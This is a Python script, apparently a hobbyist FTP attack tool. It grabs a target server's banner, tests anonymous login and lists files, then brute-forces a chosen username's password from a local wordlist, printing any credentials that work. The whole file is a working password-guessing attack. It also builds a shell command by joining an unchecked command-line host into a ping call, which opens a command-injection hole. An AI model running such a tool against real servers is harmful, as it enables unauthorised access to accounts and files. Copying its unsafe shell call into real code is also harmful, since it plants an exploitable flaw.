from ftplib import FTP
from ftplib import error_perm
import sys
import os
import time

# takes the IP address of host from command line
host = sys.argv[1]

# Makes sure host is reachable
tping = True if os.system("ping "+host+" -c 1") is 0 else False

# exits if host can't be reached
if tping == False:
    print('The host entered is not a valid Host')
    exit()

#assignes IP
ftp = FTP(host)

#open ftp connection
ftp.connect()

#pulls banner from FTP server
bann = ftp.getwelcome()

print(' FTP Banner:  '+bann)

# tries to login in with Anonymous/Anonymous
try:
    ftp.login()
except error_perm:
    print('Anon login not authorized')
    pass
else:
    print("Anon login successful!!!")
    ftp.retrlines('LIST')
    ftp.dir()


# opens password file
pas = open ('/home/alex/testpass.txt', 'r')

# asks for username to test
usr = input('Enter a username to Brute Force(type "n" to quit): ')

# if input equals n exits
if usr == 'n' or usr == 'N':
    exit()

# reads the passwords out of the file
lines = pas.readlines()

# Brute FORCE
for i in lines:
  try:
    word = i.strip('\n')
    ftp=FTP(host)
    ftp.login( usr , word)
    print('SUCCESS!!!!!!   username: ' + usr + " password: " + i)
    ftp.retrlines('LIST')
    ftp.dir()
    ftp.quit()
    pass
  except :
     pass

#Closes out the password file
pas.close()



